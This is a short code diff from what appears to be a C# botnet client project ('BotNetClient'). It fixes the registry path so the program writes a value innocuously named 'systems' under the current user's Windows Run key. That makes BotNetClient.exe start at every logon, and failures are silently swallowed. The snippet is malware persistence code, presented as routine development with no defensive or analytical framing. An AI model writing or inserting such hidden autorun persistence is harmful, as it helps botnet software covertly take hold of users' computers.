@@ -17,7 +17,7 @@ namespace BotNetClient
             try
             {
                 RegistryKey reg;
-                reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+                reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
                 reg.SetValue("systems", Environment.CurrentDirectory.ToString()+"\\BotNetClient.exe");
             }
             catch { }
